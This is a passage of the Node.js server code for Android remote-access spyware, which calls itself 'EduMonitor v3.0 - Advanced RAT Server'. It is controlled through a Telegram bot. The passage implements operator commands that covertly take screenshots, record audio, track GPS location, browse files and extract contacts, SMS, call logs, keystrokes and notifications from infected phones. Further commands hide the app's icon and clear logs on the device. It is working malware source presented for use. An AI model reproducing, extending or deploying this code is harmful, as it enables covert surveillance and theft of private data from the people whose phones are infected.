            await editMessageText(chatId, messageId,
                '🤖 *EduMonitor Control Panel*\n\nSelect an option below:',
                MainMenuKeyboard
            );
        }
        else if (data === 'menu_devices') {
            // Pass the callbackQuery object to the function
            await showDevicesMenu(chatId, messageId, callbackQuery);
        }

        else if (data === 'menu_screenshot') {
            await showScreenshotMenu(chatId, messageId);
        }
        else if (data === 'menu_recording') {
            await showRecordingMenu(chatId, messageId);
        }
        else if (data === 'menu_location') {
            await showLocationMenu(chatId, messageId);
        }
        else if (data === 'menu_files') {
            await showFilesMenu(chatId, messageId);
        }
        else if (data === 'menu_data') {
            await showDataExtractionMenu(chatId, messageId);
        }
        else if (data === 'menu_settings') {
            await editMessageText(chatId, messageId,
                '⚙️ *Settings Menu*\n\nConfigure your preferences:',
                SettingsMenuKeyboard
            );
        }
        else if (data === 'menu_help') {
            await showHelpMenu(chatId, messageId);
        }
        // Device actions
else if (data.startsWith('device_')) {
    const deviceId = data.substring(7);
    await showDeviceDetails(chatId, messageId, deviceId, callbackQuery);
}

        else if (data.startsWith('screenshot_')) {
            const deviceId = data.substring(11);
            await takeScreenshot(chatId, messageId, deviceId);
        }
        else if (data.startsWith('record_')) {
            const parts = data.split('_');
            const seconds = parseInt(parts[1]);
            const deviceId = parts.slice(2).join('_');
            await startRecording(chatId, messageId, deviceId, seconds);
        }
        else if (data.startsWith('location_')) {
            const deviceId = data.substring(9);
            await getLocation(chatId, messageId, deviceId);
        }
        else if (data.startsWith('files_')) {
            const deviceId = data.substring(6);
            await listFiles(chatId, messageId, deviceId);
        }
        else if (data.startsWith('contacts_')) {
            const parts = data.split('_');
            if (parts.length === 2) {
                const deviceId = parts[1];
                await showDataExtractionOptions(chatId, messageId, deviceId, 'contacts');
            } else {
                const format = parts[1];
                const deviceId = parts.slice(2).join('_');
                await extractData(chatId, messageId, deviceId, 'contacts', format);
            }
        }
        else if (data.startsWith('sms_')) {
            const parts = data.split('_');
            if (parts.length === 2) {
                const deviceId = parts[1];
                await showDataExtractionOptions(chatId, messageId, deviceId, 'sms');
            } else {
                const format = parts[1];
                const deviceId = parts.slice(2).join('_');
                await extractData(chatId, messageId, deviceId, 'sms', format);
            }
        }
        else if (data.startsWith('calllogs_')) {
            const parts = data.split('_');
            if (parts.length === 2) {
                const deviceId = parts[1];
                await showDataExtractionOptions(chatId, messageId, deviceId, 'calllogs');
            } else {
                const format = parts[1];
                const deviceId = parts.slice(2).join('_');
                await extractData(chatId, messageId, deviceId, 'calllogs', format);
            }
        }
        else if (data.startsWith('apps_')) {
            const parts = data.split('_');
            if (parts.length === 2) {
                const deviceId = parts[1];
                await showDataExtractionOptions(chatId, messageId, deviceId, 'apps');
            } else {
                const format = parts[1];
                const deviceId = parts.slice(2).join('_');
                await extractData(chatId, messageId, deviceId, 'apps', format);
            }
        }
        else if (data.startsWith('keystrokes_')) {
            const parts = data.split('_');
            if (parts.length === 2) {
                const deviceId = parts[1];
                await showDataExtractionOptions(chatId, messageId, deviceId, 'keystrokes');
            } else {
                const format = parts[1];
                const deviceId = parts.slice(2).join('_');
                await extractData(chatId, messageId, deviceId, 'keystrokes', format);
            }
        }
        else if (data.startsWith('notifications_')) {
            const parts = data.split('_');
            if (parts.length === 2) {
                const deviceId = parts[1];
                await showDataExtractionOptions(chatId, messageId, deviceId, 'notifications');
            } else {
                const format = parts[1];
                const deviceId = parts.slice(2).join('_');
                await extractData(chatId, messageId, deviceId, 'notifications', format);
            }
        }
        else if (data.startsWith('battery_')) {
            const deviceId = data.substring(8);
            await getBatteryStatus(chatId, messageId, deviceId);
        }
        else if (data.startsWith('network_')) {
            const deviceId = data.substring(8);
            await getNetworkInfo(chatId, messageId, deviceId);
        }
        else if (data.startsWith('storage_')) {
            const deviceId = data.substring(8);
            await getStorageInfo(chatId, messageId, deviceId);
        }
        else if (data.startsWith('reboot_')) {
            const deviceId = data.substring(7);
            await rebootDevice(chatId, messageId, deviceId);
        }
        else if (data.startsWith('hide_')) {
            const deviceId = data.substring(5);
            await hideIcon(chatId, messageId, deviceId);
        }
        else if (data.startsWith('show_')) {
            const deviceId = data.substring(5);
            await showIcon(chatId, messageId, deviceId);
        }
        else if (data.startsWith('clear_')) {
            const deviceId = data.substring(6);
            await clearLogs(chatId, messageId, deviceId);
        }
        else if (data.startsWith('info_')) {
            const deviceId = data.substring(5);
            await getDeviceInfo(chatId, messageId, deviceId);
        }
        } catch (error) {
        console.error('Error in callback handler:', error);
        // Don't try to edit message if it failed, just send a new one
        await sendTelegramMessage(chatId, 
            '⚠️ *Session Expired*\n\nPlease use /start to restart the menu.',
            { reply_markup: { inline_keyboard: MainMenuKeyboard } }
        ).catch(e => console.error('Error sending fallback message:', e));
    }
}

// ============================================
// MENU DISPLAY FUNCTIONS
// ============================================

async function showDevicesMenu(chatId, messageId, callbackQuery = null) {
    db.all('SELECT * FROM devices WHERE is_active = 1 ORDER BY last_seen DESC', [], async (err, devices) => {
        if (err) {
            console.error('Error fetching devices:', err);
            await editMessageText(chatId, messageId, '❌ Error fetching devices');
            return;
        }

        if (!devices || devices.length === 0) {
            const text = '📭 *No Devices Connected*\n\nNo devices are currently connected.';
            const keyboard = [[{ text: '🔄 REFRESH', callback_data: 'menu_devices' }, 
                               { text: '🔙 MAIN MENU', callback_data: 'menu_main' }]];
            
            // Check if callbackQuery exists before accessing its properties
            if (callbackQuery && callbackQuery.message && callbackQuery.message.text === text) {
                // Just answer the callback query without editing
                if (callbackQuery.id) {
                    await answerCallbackQuery(callbackQuery.id, 'No devices connected');
                }
                return;
            }
            
            await editMessageText(chatId, messageId, text, keyboard);
            return;
        }

        const text = `📱 *Connected Devices (${devices.length})*\n\nSelect a device to control:`;
        const keyboard = DevicesMenuKeyboard(devices);
        
        // Check if callbackQuery exists before accessing its properties
        if (callbackQuery && callbackQuery.message && callbackQuery.message.text === text) {
            if (callbackQuery.id) {
                await answerCallbackQuery(callbackQuery.id, 'Devices list refreshed');
            }
            return;
        }
        
        await editMessageText(chatId, messageId, text, keyboard);
    });
}

async function showDeviceDetails(chatId, messageId, deviceId, callbackQuery = null) {
    db.get('SELECT * FROM devices WHERE id = ?', [deviceId], async (err, device) => {
        if (err || !device) {
            const text = '❌ *Device Not Found*\n\nThe device may have disconnected.';
            const keyboard = [[{ text: '🔙 BACK TO DEVICES', callback_data: 'menu_devices' }]];
            
            if (callbackQuery && callbackQuery.message && callbackQuery.message.text === text) {
                if (callbackQuery.id) {
                    await answerCallbackQuery(callbackQuery.id, 'Device not found');
                }
                return;
            }
            
            await editMessageText(chatId, messageId, text, keyboard);
            return;
        }

        const lastSeen = new Date(device.last_seen).toLocaleString();
        const uptime = formatUptime(device.registered_at);
        const batteryEmoji = getBatteryEmoji(device.battery_level);

        const text = 
            `📱 *Device Details*\n\n` +
            `*Model:* ${device.model || 'Unknown'}\n` +
            `*Android:* ${device.android_version || 'Unknown'}\n` +
            `*Manufacturer:* ${device.manufacturer || 'Unknown'}\n` +
            `*Battery:* ${batteryEmoji} ${device.battery_level || '?'}%\n` +
            `*Last Seen:* ${lastSeen}\n` +
            `*Uptime:* ${uptime}\n` +
            `*Features:* ${device.features ? JSON.parse(device.features).join(', ') : 'Standard'}\n\n` +
            `*Select an action:*`;

        const keyboard = DeviceActionKeyboard(deviceId);
        
        if (callbackQuery && callbackQuery.message && callbackQuery.message.text === text) {
            if (callbackQuery.id) {
                await answerCallbackQuery(callbackQuery.id, 'Device details refreshed');
            }
            return;
        }
        
        await editMessageText(chatId, messageId, text, keyboard);
    });
}

async function showScreenshotMenu(chatId, messageId) {
    db.all('SELECT * FROM devices WHERE is_active = 1', [], (err, devices) => {
        if (err || !devices || devices.length === 0) {
            editMessageText(chatId, messageId,
                '📭 *No Devices Connected*',
                [[{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]]
            );
            return;
        }

        const keyboard = [];
        devices.forEach(device => {
            keyboard.push([{ 
                text: `📸 ${device.model || 'Unknown'}`, 
                callback_data: `screenshot_${device.id}` 
            }]);
        });
        keyboard.push([{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]);

        editMessageText(chatId, messageId,
            '📸 *Screenshot Menu*\n\nSelect a device to capture screen:',
            keyboard
        );
    });
}

async function showRecordingMenu(chatId, messageId) {
    db.all('SELECT * FROM devices WHERE is_active = 1', [], (err, devices) => {
        if (err || !devices || devices.length === 0) {
            editMessageText(chatId, messageId,
                '📭 *No Devices Connected*',
                [[{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]]
            );
            return;
        }

        const keyboard = [];
        devices.forEach(device => {
            keyboard.push([
                { text: `🎤 ${device.model || 'Unknown'} (30s)`, callback_data: `record_30_${device.id}` },
                { text: `🎤 (60s)`, callback_data: `record_60_${device.id}` }
            ]);
        });
        keyboard.push([{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]);

        editMessageText(chatId, messageId,
            '🎤 *Recording Menu*\n\nSelect a device and duration:',
            keyboard
        );
    });
}

async function showLocationMenu(chatId, messageId) {
    db.all('SELECT * FROM devices WHERE is_active = 1', [], (err, devices) => {
        if (err || !devices || devices.length === 0) {
            editMessageText(chatId, messageId,
                '📭 *No Devices Connected*',
                [[{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]]
            );
            return;
        }

        const keyboard = [];
        devices.forEach(device => {
            keyboard.push([{ 
                text: `📍 ${device.model || 'Unknown'}`, 
                callback_data: `location_${device.id}` 
            }]);
        });
        keyboard.push([{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]);

        editMessageText(chatId, messageId,
            '📍 *Location Menu*\n\nSelect a device to get current location:',
            keyboard
        );
    });
}

async function showFilesMenu(chatId, messageId) {
    db.all('SELECT * FROM devices WHERE is_active = 1', [], (err, devices) => {
        if (err || !devices || devices.length === 0) {
            editMessageText(chatId, messageId,
                '📭 *No Devices Connected*',
                [[{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]]
            );
            return;
        }

        const keyboard = [];
        devices.forEach(device => {
            keyboard.push([{ 
                text: `📁 ${device.model || 'Unknown'}`, 
                callback_data: `files_${device.id}` 
            }]);
        });
        keyboard.push([{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]);

        editMessageText(chatId, messageId,
            '📁 *File Explorer*\n\nSelect a device to browse files:',
            keyboard
        );
    });
}

async function showDataExtractionMenu(chatId, messageId) {
    db.all('SELECT * FROM devices WHERE is_active = 1', [], (err, devices) => {
        if (err || !devices || devices.length === 0) {
            editMessageText(chatId, messageId,
                '📭 *No Devices Connected*',
                [[{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]]
            );
            return;
        }

        if (devices.length === 1) {
            const device = devices[0];
            editMessageText(chatId, messageId,
                `📊 *Data Extraction - ${device.model || 'Unknown'}*\n\nSelect data type to extract:`,
                DataExtractionKeyboard(device.id)
            );
            return;
        }

        const keyboard = [];
        devices.forEach(device => {
            keyboard.push([{ 
                text: `📊 ${device.model || 'Unknown'}`, 
                callback_data: `data_device_${device.id}` 
            }]);
        });
        keyboard.push([{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]);

        editMessageText(chatId, messageId,
            '📊 *Data Extraction*\n\nSelect a device:',
            keyboard
        );
    });
}

async function showDataExtractionOptions(chatId, messageId, deviceId, dataType) {
    db.get('SELECT * FROM devices WHERE id = ?', [deviceId], (err, device) => {
        if (err || !device) {
            editMessageText(chatId, messageId,
                '❌ *Device Not Found*',
                [[{ text: '🔙 BACK', callback_data: 'menu_devices' }]]
            );
            return;
        }

        let typeName = '';
        switch(dataType) {
            case 'contacts': typeName = '📇 Contacts'; break;
            case 'sms': typeName = '💬 SMS'; break;
            case 'calllogs': typeName = '📞 Call Logs'; break;
            case 'apps': typeName = '📱 Apps'; break;
            case 'keystrokes': typeName = '⌨️ Keystrokes'; break;
            case 'notifications': typeName = '🔔 Notifications'; break;
        }

        const keyboard = [
            [{ text: `${typeName} (TXT)`, callback_data: `${dataType}_txt_${deviceId}` }],
            [{ text: `${typeName} (HTML)`, callback_data: `${dataType}_html_${deviceId}` }],
            [{ text: `${typeName} (JSON)`, callback_data: `${dataType}_json_${deviceId}` }],
            [{ text: `${typeName} (CSV)`, callback_data: `${dataType}_csv_${deviceId}` }],
            [{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]
        ];

        editMessageText(chatId, messageId,
            `📊 *${typeName} Extraction*\n\nSelect format for ${device.model || 'Unknown'}:`,
            keyboard
        );
    });
}

async function showHelpMenu(chatId, messageId) {
    const helpText = 
        '❓ *EduMonitor Help*\n\n' +
        '*Available Commands:*\n' +
        '• /start - Show main menu\n' +
        '• /devices - List all devices\n' +
        '• /help - Show this help\n\n' +
        '*Features:*\n' +
        '• 📸 Screenshot capture\n' +
        '• 🎤 Audio recording (30s/60s)\n' +
        '• 📍 GPS location tracking\n' +
        '• 📁 File explorer\n' +
        '• 📊 Data extraction (contacts, SMS, call logs, apps, keystrokes, notifications)\n' +
        '• 🔋 Battery monitoring\n' +
        '• 📡 Network information\n' +
        '• 💾 Storage information\n\n' +
        '*Advanced:*\n' +
        '• 👻 Hide/show app icon\n' +
        '• 🔄 Reboot services\n' +
        '• 🗑️ Clear logs\n\n' +
        '*Data Formats:*\n' +
        '• TXT - Plain text format\n' +
        '• HTML - Formatted HTML table\n' +
        '• JSON - Raw JSON data\n' +
        '• CSV - Comma-separated values';

    await editMessageText(chatId, messageId, helpText, [
        [{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]
    ]);
}

// ============================================
// COMMAND EXECUTION FUNCTIONS
// ============================================

async function takeScreenshot(chatId, messageId, deviceId) {
    console.log(`\n📸 ===== TAKING SCREENSHOT =====`);
    console.log(`Device ID: ${deviceId}`);
    
    await editMessageText(chatId, messageId,
        `📸 *Taking Screenshot*\n\n⏳ Please wait...`,
        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
    );

    const result = deviceManager.sendCommand(deviceId, 'take_screenshot', {}, (success, data, error) => {
        console.log(`📥 Screenshot response:`, { success, error });
        
        if (success) {
            editMessageText(chatId, messageId,
                `✅ *Screenshot captured successfully!*\n\nProcessing and uploading...`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        } else {
            editMessageText(chatId, messageId,
                `❌ *Screenshot Failed*\n\nError: ${error || 'Unknown error'}`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        }
    });

    if (!result.success) {
        console.error(`❌ Failed to send screenshot command:`, result.error);
        await editMessageText(chatId, messageId,
            `❌ *Failed to send command*\n\nDevice may be offline.`,
            [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
        );
    }
    console.log(`==============================\n`);
}

async function startRecording(chatId, messageId, deviceId, seconds) {
    console.log(`\n🎤 ===== STARTING RECORDING =====`);
    console.log(`Device ID: ${deviceId}`);
    console.log(`Duration: ${seconds}s`);
    
    await editMessageText(chatId, messageId,
        `🎤 *Starting Recording*\n\nDuration: ${seconds}s\n⏳ Please wait...`,
        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
    );

    const result = deviceManager.sendCommand(deviceId, 'record_audio', { seconds }, (success, data, error) => {
        console.log(`📥 Recording response:`, { success, error });
        
        if (success) {
            editMessageText(chatId, messageId,
                `✅ *Recording completed!*\n\nProcessing and uploading...`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        } else {
            editMessageText(chatId, messageId,
                `❌ *Recording Failed*\n\nError: ${error || 'Unknown error'}`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        }
    });

    if (!result.success) {
        await editMessageText(chatId, messageId,
            `❌ *Failed to send command*\n\nDevice may be offline.`,
            [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
        );
    }
    console.log(`==============================\n`);
}

async function getLocation(chatId, messageId, deviceId) {
    console.log(`\n📍 ===== GETTING LOCATION =====`);
    console.log(`Device ID: ${deviceId}`);
    
    await editMessageText(chatId, messageId,
        `📍 *Getting Location*\n\n⏳ Please wait...`,
        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
    );

    const result = deviceManager.sendCommand(deviceId, 'get_location', {}, (success, data, error) => {
        if (!success) {
            editMessageText(chatId, messageId,
                `❌ *Location Failed*\n\nError: ${error || 'Unknown error'}`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        }
    });

    if (!result.success) {
        await editMessageText(chatId, messageId,
            `❌ *Failed to send command*\n\nDevice may be offline.`,
            [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
        );
    }
    console.log(`==============================\n`);
}

async function listFiles(chatId, messageId, deviceId) {
    console.log(`\n📁 ===== LISTING FILES =====`);
    console.log(`Device ID: ${deviceId}`);
    
    await editMessageText(chatId, messageId,
        `📁 *Listing Files*\n\nDefault path: /sdcard\n⏳ Please wait...`,
        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
    );
    
    const defaultPath = '/sdcard';
    
    const result = deviceManager.sendCommand(deviceId, 'list_files', { path: defaultPath }, (success, data, error) => {
        if (success && data.files) {
            let fileList = `📁 *Files in ${data.path || defaultPath}*\n\n`;
            data.files.slice(0, 20).forEach(f => {
                const icon = f.isDirectory ? '📁' : '📄';
                const size = f.size ? ` (${formatFileSize(f.size)})` : '';
                fileList += `${icon} ${f.name}${size}\n`;
            });
            if (data.files.length > 20) {
                fileList += `\n... and ${data.files.length - 20} more`;
            }
            editMessageText(chatId, messageId, fileList,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        } else {
            editMessageText(chatId, messageId,
                `❌ *Failed to list files*\n\nError: ${error || 'Access denied'}`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        }
    });
    console.log(`==============================\n`);
}

async function extractData(chatId, messageId, deviceId, dataType, format) {
    console.log(`\n📊 ===== EXTRACTING DATA =====`);
    console.log(`Device ID: ${deviceId}`);
    console.log(`Data Type: ${dataType}`);
    console.log(`Format: ${format}`);
    
    await editMessageText(chatId, messageId,
        `📊 *Extracting ${dataType}*\n\nFormat: ${format.toUpperCase()}\n⏳ Please wait...`,
        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
    );

    // First check if device is connected
    const device = deviceManager.devices.get(deviceId);
    console.log('Device connection status:', device ? 'Connected' : 'Not connected');
    if (device) {
        console.log('WebSocket state:', device.ws ? device.ws.readyState : 'No WebSocket');
    }

    const command = `get_${dataType}_${format}`;
    console.log(`📤 Sending command: ${command}`);
    
    const result = deviceManager.sendCommand(deviceId, command, {}, (success, data, error) => {
        console.log(`📥 Command response for ${command}:`, { success, error, data });
        
        if (success) {
            let responseText = `✅ *${dataType} extracted successfully!*\n\n`;
            responseText += `Format: ${format.toUpperCase()}\n`;
            
            if (data && data.count !== undefined) {
                responseText += `Count: ${data.count}\n`;
            }
            if (data && data.file) {
                responseText += `File: ${data.file}\n`;
            }
            if (data && data.message) {
                responseText += `\n${data.message}`;
            }
            
            editMessageText(chatId, messageId, responseText,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        } else {
            editMessageText(chatId, messageId,
                `❌ *Extraction Failed*\n\nError: ${error || 'Unknown error'}\nCommand: ${command}`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        }
    });

    console.log('sendCommand result:', result);
    
    if (!result.success) {
        console.error(`❌ Failed to send command:`, result.error);
        await editMessageText(chatId, messageId,
            `❌ *Failed to send command*\n\nError: ${result.error || 'Device may be offline'}\nDevice ID: ${deviceId}`,
            [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
        );
    }
    console.log(`==============================\n`);
}

async function getBatteryStatus(chatId, messageId, deviceId) {
    db.get('SELECT * FROM devices WHERE id = ?', [deviceId], (err, device) => {
        if (err || !device) {
            editMessageText(chatId, messageId,
                '❌ *Device Not Found*',
                [[{ text: '🔙 BACK', callback_data: 'menu_devices' }]]
            );
            return;
        }

        const batteryEmoji = getBatteryEmoji(device.battery_level);
        const message = 
            `🔋 *Battery Status - ${device.model || 'Unknown'}*\n\n` +
            `Level: ${batteryEmoji} ${device.battery_level || '?'}%\n` +
            `Last Updated: ${new Date(device.last_seen).toLocaleString()}`;

        editMessageText(chatId, messageId, message,
            [[{ text: '🔄 REFRESH', callback_data: `battery_${deviceId}` }, 
              { text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
        );
    });
}

async function getNetworkInfo(chatId, messageId, deviceId) {
    await editMessageText(chatId, messageId,
        `📡 *Getting Network Info*\n\n⏳ Please wait...`,
        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
    );

    const result = deviceManager.sendCommand(deviceId, 'get_network_info', {}, (success, data, error) => {
        if (success) {
            let message = `📡 *Network Info - ${deviceManager.devices.get(deviceId)?.info.model || 'Device'}*\n\n`;
            if (data.connected) {
                message += `Status: ✅ Connected\n`;
                message += `Type: ${data.type}\n`;
                if (data.ssid) message += `WiFi: ${data.ssid}\n`;
                if (data.ip) message += `IP: ${data.ip}\n`;
                if (data.signal) message += `Signal: ${data.signal}dBm\n`;
            } else {
                message += `Status: ❌ Disconnected\n`;
            }
            editMessageText(chatId, messageId, message,
                [[{ text: '🔄 REFRESH', callback_data: `network_${deviceId}` }, 
                  { text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        } else {
            editMessageText(chatId, messageId,
                `❌ *Failed to get network info*\n\nError: ${error || 'Unknown error'}`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        }
    });
}

async function getStorageInfo(chatId, messageId, deviceId) {
    await editMessageText(chatId, messageId,
        `💾 *Getting Storage Info*\n\n⏳ Please wait...`,
        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
    );

    const result = deviceManager.sendCommand(deviceId, 'get_storage_info', {}, (success, data, error) => {
        if (success) {
            let message = `💾 *Storage Info - ${deviceManager.devices.get(deviceId)?.info.model || 'Device'}*\n\n`;
            if (data.internal_total) {
                message += `*Internal Storage:*\n`;
                message += `Total: ${formatFileSize(data.internal_total)}\n`;
                message += `Used: ${formatFileSize(data.internal_used)}\n`;
                message += `Free: ${formatFileSize(data.internal_free)}\n`;
                message += `Usage: ${Math.round((data.internal_used / data.internal_total) * 100)}%\n\n`;
            }
            if (data.external_total) {
                message += `*External Storage:*\n`;
                message += `Total: ${formatFileSize(data.external_total)}\n`;
                message += `Used: ${formatFileSize(data.external_used)}\n`;
                message += `Free: ${formatFileSize(data.external_free)}\n`;
                message += `Usage: ${Math.round((data.external_used / data.external_total) * 100)}%\n`;
            }
            editMessageText(chatId, messageId, message,
                [[{ text: '🔄 REFRESH', callback_data: `storage_${deviceId}` }, 
                  { text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        } else {
            editMessageText(chatId, messageId,
                `❌ *Failed to get storage info*\n\nError: ${error || 'Unknown error'}`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        }
    });
}

async function getDeviceInfo(chatId, messageId, deviceId) {
    db.get('SELECT * FROM devices WHERE id = ?', [deviceId], (err, device) => {
        if (err || !device) {
            editMessageText(chatId, messageId,
                '❌ *Device Not Found*',
                [[{ text: '🔙 BACK', callback_data: 'menu_devices' }]]
            );
            return;
        }

        const message = 
            `ℹ️ *Device Information*\n\n` +
            `*Model:* ${device.model || 'Unknown'}\n` +
            `*Android:* ${device.android_version || 'Unknown'}\n` +
            `*Manufacturer:* ${device.manufacturer || 'Unknown'}\n` +
            `*Device ID:* \`${device.id}\`\n` +
            `*Features:* ${device.features ? JSON.parse(device.features).join(', ') : 'Standard'}\n` +
            `*Registered:* ${new Date(device.registered_at).toLocaleString()}\n` +
            `*Last Seen:* ${new Date(device.last_seen).toLocaleString()}`;

        editMessageText(chatId, messageId, message,
            [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
        );
    });
}

async function rebootDevice(chatId, messageId, deviceId) {
    await editMessageText(chatId, messageId,
        `🔄 *Rebooting Services*\n\n⏳ Please wait...`,
        [[{ text: '🔙 CANCEL', callback_data: `device_${deviceId}` }]]
    );

    const result = deviceManager.sendCommand(deviceId, 'reboot_services', {}, (success, data, error) => {
        if (success) {
            editMessageText(chatId, messageId,
                `✅ *Services rebooted successfully!*`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        } else {
            editMessageText(chatId, messageId,
                `❌ *Reboot Failed*\n\nError: ${error || 'Unknown error'}`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        }
    });
}

async function hideIcon(chatId, messageId, deviceId) {
    const result = deviceManager.sendCommand(deviceId, 'hide_icon', {}, (success, data, error) => {
        if (success) {
            editMessageText(chatId, messageId,
                `👻 *Icon hidden successfully!*\n\nApp icon is now hidden from launcher.`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        } else {
            editMessageText(chatId, messageId,
                `❌ *Failed to hide icon*\n\nError: ${error || 'Unknown error'}`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        }
    });
}

async function showIcon(chatId, messageId, deviceId) {
    const result = deviceManager.sendCommand(deviceId, 'show_icon', {}, (success, data, error) => {
        if (success) {
            editMessageText(chatId, messageId,
                `👁️ *Icon shown successfully!*\n\nApp icon is now visible in launcher.`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        } else {
            editMessageText(chatId, messageId,
                `❌ *Failed to show icon*\n\nError: ${error || 'Unknown error'}`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        }
    });
}

async function clearLogs(chatId, messageId, deviceId) {
    const result = deviceManager.sendCommand(deviceId, 'clear_logs', {}, (success, data, error) => {
        if (success) {
            editMessageText(chatId, messageId,
                `🗑️ *Logs cleared successfully!*`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        } else {
            editMessageText(chatId, messageId,
                `❌ *Failed to clear logs*\n\nError: ${error || 'Unknown error'}`,
                [[{ text: '🔙 BACK', callback_data: `device_${deviceId}` }]]
            );
        }
    });
}

// ============================================
// UTILITY FUNCTIONS
// ============================================
function getBatteryEmoji(level) {
    if (!level) return '❓';
    if (level > 80) return '🔋';
    if (level > 50) return '⚡';
    if (level > 20) return '⚠️';
    return '🪫';
}

function formatUptime(timestamp) {
    const seconds = Math.floor((Date.now() - timestamp) / 1000);
    const days = Math.floor(seconds / 86400);
    const hours = Math.floor((seconds % 86400) / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    
    if (days > 0) return `${days}d ${hours}h`;
    if (hours > 0) return `${hours}h ${minutes}m`;
    return `${minutes}m`;
}

function formatFileSize(bytes) {
    if (!bytes) return '0 B';
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(1024));
    return (bytes / Math.pow(1024, i)).toFixed(1) + ' ' + sizes[i];
}

// ============================================
// CLEANUP JOBS
// ============================================
schedule.scheduleJob('0 0 * * *', () => {
    const cutoff = Date.now() - config.storage.retentionDays * 24 * 60 * 60 * 1000;
    
    db.all('SELECT file_path FROM media WHERE timestamp < ?', [cutoff], (err, media) => {
        if (err || !media) return;
        media.forEach(item => {
            try {
                if (item.file_path && fs.existsSync(item.file_path)) {
                    fs.unlinkSync(item.file_path);
                }
            } catch (error) {
                console.error('Cleanup error:', error);
            }
        });
    });

    db.run('DELETE FROM media WHERE timestamp < ?', [cutoff]);
    db.run('DELETE FROM locations WHERE timestamp < ?', [cutoff]);
    db.run('DELETE FROM keystrokes WHERE timestamp < ?', [cutoff]);
    db.run('DELETE FROM notifications WHERE timestamp < ?', [cutoff]);
});

// ============================================
// 404 HANDLER
// ============================================
app.use((req, res) => {
    console.log(`❌ 404 - Not Found: ${req.method} ${req.url}`);
    res.status(404).json({ 
        error: 'Endpoint not found',
        path: req.url,
        method: req.method
    });
});

// Error handler
app.use((err, req, res, next) => {
    console.error('Server error:', err.stack);
    res.status(500).json({ 
        error: 'Internal server error', 
        message: err.message 
    });
});

// ============================================
// START SERVER
// ============================================
if (!fs.existsSync('uploads')) {
    fs.mkdirSync('uploads', { recursive: true });
}

server.listen(config.server.port, config.server.host, () => {
    console.log('\n🚀 ===============================================');
    console.log(`🚀 EduMonitor v3.0 - Advanced RAT Server`);
    console.log(`🚀 ===============================================`);
    console.log(`\n📡 HTTP Server: http://${config.server.host}:${config.server.port}`);
    console.log(`🔌 WebSocket: ws://${config.server.host}:${config.server.port}/ws`);
    console.log(`🤖 Telegram Bot: @${config.telegram.token.split(':')[0]}`);
    console.log(`📊 Database: SQLite3 (edumonitor.db)`);
    
    setWebhook();

    console.log(`🔐 Encryption: AES-256-GCM`);
    console.log(`\n✅ Features Enabled:`);
    console.log(`   └─ Professional Inline Keyboards`);
    console.log(`   └─ Full Command Set (30+ commands)`);
    console.log(`   └─ Real-time Command Callbacks`);
    console.log(`   └─ WebSocket + HTTP Fallback`);
    console.log(`   └─ File Upload & Processing`);
    console.log(`   └─ Data Extraction (Contacts, SMS, Call Logs, Apps, Keystrokes, Notifications)`);
    console.log(`   └─ Device Management`);
    console.log(`   └─ Multiple Format Support (TXT, HTML, JSON, CSV)`);
    console.log(`   └─ Auto Cleanup`);
    console.log(`   └─ Comprehensive Debug Logging`);
    console.log(`\n🚀 ===============================================\n`);
});

// Graceful shutdown
process.on('SIGTERM', shutdown);
process.on('SIGINT', shutdown);

function shutdown() {
    console.log('\n🛑 Shutting down gracefully...');
    deviceManager.broadcastToDevices({ type: 'shutdown', timestamp: Date.now() });
    wss.close();
    server.close(() => {
        db.close();
        process.exit(0);
    });
}

module.exports = { app, server, wss, deviceManager, db };
